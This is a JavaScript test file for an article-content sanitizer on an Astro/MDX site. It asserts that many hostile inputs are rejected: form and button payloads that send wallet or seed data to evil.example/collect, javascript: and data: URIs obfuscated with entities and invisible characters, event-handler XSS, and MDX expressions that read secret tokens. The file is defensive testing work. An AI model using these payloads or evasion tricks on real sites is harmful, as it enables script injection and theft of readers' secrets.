import assert from 'node:assert/strict';
import { validateArticleContent } from './sync-articles.js';

const TAB = String.fromCharCode(0x09);
const ZERO_WIDTH_SPACE = String.fromCharCode(0x200b);
const SOFT_HYPHEN = String.fromCharCode(0x00ad);
const WORD_JOINER = String.fromCharCode(0x2060);
const NEXT_LINE = String.fromCharCode(0x85);

function rejects(content, label) {
  assert.throws(() => validateArticleContent('fixture', content), /Unsafe article content/, label);
}

function accepts(content, label) {
  assert.doesNotThrow(() => validateArticleContent('fixture', content), label);
}

// <base> tags are blocked: a single <base> rewrites every relative URL on the page.
rejects('Intro.\n\n<base href="https://evil.example/">', 'plain <base>');
rejects('Intro.\n\n<  base   href="https://evil.example/">', 'spaced <base>');

// define:vars can be entity-encoded to evade the literal pattern scan --
// define&#58;vars decodes to define:vars which Astro evaluates at build time.
rejects('Use define&#58;vars to inject.', 'entity-encoded define:vars');
rejects('Use define:vars to inject.', 'plain define:vars');
rejects('Intro.\n\n<frame src="https://evil.example/frame.html">', 'plain <frame>');
rejects('Intro.\n\n<frameset cols="50%,50%"><frame src="a.html"></frameset>', 'plain <frameset>');

// <form> tags are blocked: a raw form can submit reader data (e.g. wallet
// addresses entered into a hidden input) to an attacker-controlled action URL,
// with no JS and no flagged scheme -- action="https://..." passes every
// scheme/handler check above.
rejects('Intro.\n\n<form action="https://evil.example/collect" method="GET"><input name="wallet"><button>Go</button></form>', 'plain <form>');
rejects('Intro.\n\n<  form   action="https://evil.example/collect">', 'spaced <form>');

// Standalone form controls are blocked too: #184 blocks <form>, but a lone
// <button formaction="https://..."> or <input type="hidden" name="wallet"> still
// renders and can exfiltrate data without a wrapping form or flagged scheme.
rejects('Intro.\n\n<button formaction="https://evil.example/collect">Send</button>', 'plain button formaction');
rejects('Intro.\n\n<  button   formaction="https://evil.example/collect">', 'spaced button');
rejects('Intro.\n\n<input type="hidden" name="wallet" value="5Grw...">', 'plain hidden input');
rejects('Intro.\n\n<  input   type="text" name="seed">', 'spaced input');
rejects('Intro.\n\n<textarea name="note">secret</textarea>', 'plain textarea');
rejects('Intro.\n\n<select name="wallet"><option>5Grw...</option></select>', 'plain select');
rejects('Intro.\n\n<option value="evil">Pick me</option>', 'standalone option');
rejects('Intro.\n\n<fieldset><legend>Seed phrase</legend></fieldset>', 'standalone fieldset');
rejects('Intro.\n\n<datalist id="wallets"><option value="5Grw..."></datalist>', 'standalone datalist');
rejects('Intro.\n\n<output name="result">done</output>', 'standalone output');

// Plain dangerous URL schemes remain blocked.
rejects('See [x](javascript:alert(1)).', 'plain javascript:');
rejects('See [x](vbscript:msgbox(1)).', 'plain vbscript:');
rejects('See [x](data:text/html;base64,PHNjcmlwdD4=).', 'plain data:text/html');
rejects('See [x](data:image/svg+xml,<svg></svg>).', 'plain svg data uri');
rejects('See [x](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+).', 'base64 svg data uri (script hidden in blob)');
rejects('See [x](data:application/xhtml+xml;base64,PHNjcmlwdD4=).', 'base64 xhtml data uri (script hidden in blob)');
rejects('See [x](data:text/javascript,alert(1)).', 'plain data:text/javascript');
rejects('See [x](data:application/ecmascript,alert(1)).', 'plain data:application/ecmascript');
rejects('See [x](&#100;ata:text/javascript,alert(1)).', 'entity data:text/javascript');

// MDX expression braces execute at build time in article bodies. They are only
// allowed when escaped as literal prose or inside Markdown code examples.
rejects('Do not evaluate {process.env.SECRET_TOKEN}.', 'plain MDX expression brace');
rejects('A stray closing brace } is rejected conservatively.', 'stray MDX closing brace');
rejects(String.raw`Even backslashes do not escape \\{process.env.SECRET_TOKEN}.`, 'double-backslash MDX brace evasion');

// MDX disables CommonMark indented code blocks (they collide with JSX
// indentation), so a 4-space / tab indented line is NOT inert code: its braces
// evaluate as a live MDX expression at build time. The scanner must reject
// indented braces, not mistake them for a code block and skip them.
rejects('Intro.\n\n    {process.env.SECRET_TOKEN}\n', 'four-space indented MDX expression');
rejects('Intro.\n\n\t{process.env.SECRET_TOKEN}\n', 'tab-indented MDX expression');
rejects('- item\n\n    {process.env.SECRET_TOKEN}\n', 'list-indented MDX expression');
rejects('> quote\n\n    {process.env.SECRET_TOKEN}\n', 'blockquote-indented MDX expression');

// Obfuscated dangerous schemes are now blocked too.
rejects('See [x](java&amp;#115;cript:alert(1)).', 'double-encoded amp javascript:');
rejects('See [x](java&#115;cript:alert(1)).', 'decimal-entity javascript:');
rejects('See [x](java&#x73;cript:alert(1)).', 'hex-entity javascript:');
rejects('See [x](javascript&colon;alert(1)).', 'named-colon javascript:');
rejects(`See [x](java${TAB}script:alert(1)).`, 'tab-split javascript:');
rejects(`See [x](java${ZERO_WIDTH_SPACE}script:alert(1)).`, 'zero-width javascript:');
rejects(`See [x](java${SOFT_HYPHEN}script:alert(1)).`, 'soft-hyphen javascript:');
rejects(`See [x](java${WORD_JOINER}script:alert(1)).`, 'word-joiner javascript:');
rejects(`See [x](java${NEXT_LINE}script:alert(1)).`, 'C1-control javascript:');
rejects('See [x](&#100;ata:text/html,evil).', 'entity data:text/html');
rejects('See [x](vb&#115;cript:msgbox(1)).', 'decimal-entity vbscript:');
rejects('See [x](&#100;ata:image/svg+xml;base64,PHN2Zz4=).', 'entity-obfuscated svg data uri');
rejects('See [x](&#100;ata:application/xhtml+xml;base64,PHNjcmlwdD4=).', 'entity-obfuscated xhtml data uri');
rejects('See [x](data:image/svg&plus;xml;base64,PHN2Zz4=).', 'named-plus-entity svg data uri');
rejects('See [x](data:application/xhtml&plus;xml;base64,PHNjcmlwdD4=).', 'named-plus-entity xhtml data uri');

// Inline event handlers are blocked regardless of the attribute delimiter — a
// slash, or a quote abutting the handler — not just a leading space.
rejects('<img src=x onerror=alert(1)>', 'space-delimited handler');
rejects('<img src=x/onerror=alert(1)>', 'slash-delimited handler');
rejects('<a href="x"onclick=alert(1)>c</a>', 'quote-abutted handler');
rejects("<p title='a'onmouseover=alert(1)>h</p>", 'single-quote-abutted handler');

// Legitimate content passes — guard against false positives.
accepts(
  '# Staking\n\nStaking locks TAO. Source: [docs](https://docs.bittensor.com/).',
  'normal article'
);
accepts(
  'The word JavaScript appears here, and a base value of 10, without any scheme.',
  'benign keywords (no scheme)'
);
accepts(
  'VBScript is a legacy Microsoft scripting language, mentioned here only as prose.',
  'benign vbscript keyword (no scheme)'
);
accepts(
  'A raster data URI such as data:image/png;base64,iVBORw0KGgo= is harmless and allowed.',
  'benign raster data URI (only script-capable data URLs are blocked)'
);
accepts(
  'Encode an ampersand as &amp; or a snowman as &#9731; without tripping the scanner.',
  'benign entities'
);
accepts(
  'Prose may use the plus entity: C&plus;&plus; and the sum 2 &plus; 2 = 4 are fine.',
  'benign named-plus entity (no scheme)'
);
accepts(
  String.raw`Literal braces can be escaped as \{alpha\} in prose.`,
  'escaped literal MDX braces'
);
accepts(
  '---\ntitle: "Alpha {TAO}"\n---\n\nFrontmatter braces are metadata, not article-body MDX.',
  'frontmatter braces'
);
accepts(
  '```jsx\n{process.env.SECRET_TOKEN}\n```\n',
  'fenced code block with braces'
);
accepts(
  '~~~js\n{process.env.SECRET_TOKEN}\n~~~\n',
  'tilde fenced code block with braces'
);
accepts(
  'Use `{process.env.SECRET_TOKEN}` as an inline code example.',
  'inline code span with braces'
);
accepts(
  'Emoji before code stays aligned 🧠 `{process.env.SECRET_TOKEN}`.',
  'inline code span after astral Unicode'
);
accepts(
  'A query like [docs](https://example.com/online=1) is fine — a URL path segment is not a handler.',
  'url segment resembling a handler (not inside a tag)'
);
// Handler-like text inside a quoted attribute value is NOT an inline handler:
// the slash lives in a URL/path, not at an attribute boundary.
accepts('<a href="/online=1">link</a>', 'handler-like path in a quoted href value');
accepts('<img src="/onboarding=1.png" alt="x">', 'handler-like path in a quoted src value');
accepts('<code data-example="/onerror=not-handler">snippet</code>', 'handler-like text in a quoted data- value');

rejects('Hydrate with client:load here.', 'client directive token in article body');
rejects('Render via server:defer here.', 'server directive token in article body');
rejects('Animate with transition:animate here.', 'transition directive token in article body');
rejects('Render with is:raw here.', 'is directive token in article body');
rejects('Render with class:list here.', 'class:list directive token in article body');
rejects('Render with set:text here.', 'set:text directive token in article body');
rejects('Pass secrets with define:vars={{ token }}.', 'define:vars directive token in article body');
rejects('Use define:style={{ color: "red" }}.', 'define:style directive token in article body');
rejects('Use define:env to inject.', 'unlisted define directive token in article body');
rejects('Render with class&#58;list here.', 'entity-encoded class:list directive');
rejects('Render with set&#58;text here.', 'entity-encoded set:text directive');
rejects('Use define&#58;style to inject.', 'entity-encoded define:style');
rejects('Use define&#58;env to inject.', 'entity-encoded unlisted define directive');

// Every template directive — not just define:vars/style — must also be caught
// after entity/zero-width deobfuscation, so an obfuscated spelling cannot slip
// the literal scan the way `set&colon;html` once did.
rejects('Inject set&#58;html here.', 'entity-encoded set:html');
rejects('Inject set&colon;html here.', 'named-colon set:html');
rejects(`Inject set:ht${SOFT_HYPHEN}ml here.`, 'soft-hyphen set:html');
rejects(`Inject set:te${SOFT_HYPHEN}xt here.`, 'soft-hyphen set:text');
rejects(`Render with class:li${SOFT_HYPHEN}st here.`, 'soft-hyphen class:list');
rejects('Hydrate with client&#58;load here.', 'entity-encoded client: directive');
rejects('Render via server&colon;defer here.', 'named-colon server: directive');
rejects('Animate with transition&#58;animate here.', 'entity-encoded transition: directive');
rejects('Render with is&colon;raw here.', 'named-colon is: directive');
rejects(`Use define:pr${SOFT_HYPHEN}ops here.`, 'soft-hyphen unlisted define directive');

// Astro slot attributes on raw HTML must not appear in article bodies.
rejects('Intro.\n\n<div slot="sidebar">evil</div>', 'plain slot attribute');
rejects('Intro.\n\n<  div   slot="sidebar">', 'spaced slot attribute');

// xmlns namespace attribute assignments must not appear in article bodies.
rejects('Intro.\n\n<svg xmlns="http://www.w3.org/2000/svg"></svg>', 'plain xmlns attribute');
rejects('Intro.\n\n<svg xmlns = "http://www.w3.org/2000/svg"></svg>', 'spaced equals xmlns attribute');
rejects('Intro.\n\n<svg xmlns:xlink="http://www.w3.org/1999/xlink"></svg>', 'plain xmlns:prefix attribute');
rejects('Intro.\n\n<  svg   xmlns : xlink = "http://www.w3.org/1999/xlink">', 'spaced xmlns:prefix attribute');

// Prose that merely mentions xmlns without an attribute assignment must still pass.
accepts('The xmlns attribute declares an XML namespace in markup.', 'benign xmlns prose');
accepts('The xmlns:xlink attribute is used in SVG documents.', 'benign xmlns:prefix prose');

// <svg> and <math> are foreign-content roots and a classic mXSS vector. They are
// blocked as elements outright -- even without an xmlns attribute, an event
// handler, or a flagged scheme, which the cases below deliberately omit so they
// only pass once the element block itself is present.
rejects('Intro.\n\n<svg viewBox="0 0 1 1"><circle r="1" /></svg>', 'plain <svg> element');
rejects('Intro.\n\n<  svg  ><circle r="1" /></svg>', 'spaced <svg> element');
rejects('Intro.\n\n<math><mi>x</mi></math>', 'plain <math> element');
rejects('Intro.\n\n<  math  ><mi>x</mi></math>', 'spaced <math> element');

// Prose that merely names these formats without an opening tag must still pass.
accepts('SVG and MathML are XML-based formats, described here only as prose.', 'benign svg/math prose');

// Prose that merely mentions these English words without the directive colon
// must still pass — guard the new patterns against false positives.
accepts('This client is set to define the class list style, and the server is fast.', 'benign client/server/set/class/define prose');

console.log('Content sanitizer check passed');
